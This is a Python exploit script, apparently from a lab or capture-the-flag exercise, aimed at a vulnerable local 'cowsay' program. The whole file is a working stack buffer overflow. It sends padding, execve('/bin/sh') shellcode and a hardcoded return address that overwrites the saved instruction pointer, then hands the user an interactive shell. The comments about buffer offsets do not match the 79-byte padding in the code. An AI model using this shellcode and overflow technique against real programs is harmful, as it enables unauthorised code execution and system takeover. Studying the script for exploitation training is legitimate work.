import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

shellcode = "\x48\x31\xC0\x50\x49\xBA\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05\x90\x90\x90"

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
# $rbp-0x100 = 0x7fffffffecd0
# So $rbp-0x100 + (256-32) = 0x7fffffffedb0
# Last 32 bytes before rbp contain the shellcode and the 8 bytes after that overwrite $rip and execute the shellcode
p.sendline('A' * 79 + shellcode + 'B' * 8 + p64(0x7fffffffedb0))

p.interactive()
